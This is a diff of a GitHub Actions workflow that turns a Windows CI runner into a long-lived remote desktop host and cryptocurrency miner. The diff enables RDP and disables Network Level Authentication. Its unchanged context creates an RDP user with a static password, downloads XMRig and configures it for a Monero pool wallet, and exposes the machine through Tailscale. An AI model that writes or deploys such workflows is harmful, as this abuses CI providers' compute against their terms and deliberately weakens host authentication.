@@ -4,15 +4,39 @@ on:
   workflow_dispatch:
 
 jobs:
-  secure-rdp:
+  secure-rdP:
     runs-on: windows-latest
     timeout-minutes: 3600
 
     steps:
       - name: Configure Core RDP Settings
         run: |
+          # --- Start of RDP Configuration ---
+          # Enable Remote Desktop connections
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
+          
+          # IMPORTANT: Disable Network Level Authentication (NLA) for reliability
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
+          
+          # Add a firewall rule for the RDP port
           netsh advfirewall firewall add rule name="Allow RDP" dir=in action=allow protocol=TCP localport=3389
+          
+          # Restart the Remote Desktop service to apply all changes
+          Write-Host "Restarting Remote Desktop service..."
+          Restart-Service -Name TermService -Force
+          
+          # Add a small delay to allow the service to restart fully
+          Start-Sleep -Seconds 5
+          
+          # Self-test to verify the RDP port is listening locally
+          Write-Host "Verifying RDP port is listening on localhost..."
+          $testResult = Test-NetConnection -ComputerName localhost -Port 3389
+          if (-not $testResult.TcpTestSucceeded) {
+              Write-Error "RDP service is not listening on port 3389 after configuration."
+              exit 1
+          }
+          Write-Host "RDP port verification successful. Service is listening."
+          # --- End of RDP Configuration ---
 
       - name: Create RDP User with Static Password
         run: |
@@ -32,48 +56,26 @@ jobs:
       - name: Install and Configure XMRig Miner
         run: |
           $ErrorActionPreference = "Stop"
-
           $minerVersion = "6.21.2"
           $downloadUrl = "https://github.com/xmrig/xmrig/releases/download/v$($minerVersion)/xmrig-$($minerVersion)-msvc-win64.zip"
           $zipPath = "$env:TEMP\xmrig.zip"
           $desktopPath = "C:\Users\RDP\Desktop"
 
           New-Item -ItemType Directory -Force -Path $desktopPath
-          
           Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath
-          
           Expand-Archive -Path $zipPath -DestinationPath $desktopPath -Force
           
           $minerFolder = (Get-ChildItem -Path $desktopPath -Directory | Where-Object { $_.Name -like 'xmrig*' }).FullName
-          if (-not $minerFolder) {
-              Write-Error "Could not find extracted XMRig folder on the desktop!"
-              exit 1
-          }
+          if (-not $minerFolder) { Write-Error "Could not find extracted XMRig folder!"; exit 1 }
           
-          $jsonContent = '{' + `
-            '"autosave": true,' + `
-            '"cpu": true,' + `
-            '"opencl": false,' + `
-            '"cuda": false,' + `
-            '"pools": [' + `
-            '{' + `
-            '"algo": "rx/0",' + `
-            '"url": "pool.supportxmr.com:5555",' + `
-            '"user": "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsyn3wede4o9ryebixumbccy5ocdoskks2u6t9gxjfzjnkxc7tj1uq4uky5bp",' + `
-            '"pass": "x"' + `
-            '}' + `
-            ']' + `
-            '}'
+          $jsonContent = '{"autosave": true,"cpu": true,"opencl": false,"cuda": false,"pools": [{"algo": "rx/0","url": "pool.supportxmr.com:5555","user": "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsyn3wede4o9ryebixumbccy5ocdoskks2u6t9gxjfzjnkxc7tj1uq4uky5bp","pass": "x"}]}'
           $jsonContent | ConvertFrom-Json | ConvertTo-Json -Depth 100 | Set-Content -Path (Join-Path $minerFolder "config.json")
 
           $shortcutContent = "@echo off`r`necho Starting XMRig Miner...`r`ncd /d ""%~dp0""`r`ncd ""$($minerFolder.Split('\')[-1])""`r`nxmrig.exe`r`npause"
           Set-Content -Path (Join-Path $desktopPath "Start-Miner.bat") -Value $shortcutContent
           
-          Write-Host "--- Verification Step ---"
-          Write-Host "Listing contents of the RDP user's desktop:"
+          Write-Host "Verification: Listing contents of the RDP user's desktop:"
           ls $desktopPath
-          Write-Host "-------------------------"
-
 
       - name: Install Tailscale
         run: |
@@ -87,10 +89,7 @@ jobs:
           Start-Sleep -Seconds 10
           $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
           
-          if (-not $tsIP) {
-              Write-Error "Tailscale IP not assigned. Exiting."
-              exit 1
-          }
+          if (-not $tsIP) { Write-Error "Tailscale IP not assigned. Exiting."; exit 1 }
           echo "TAILSCALE_IP=$tsIP" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
       
       - name: Display RDP Connection Details
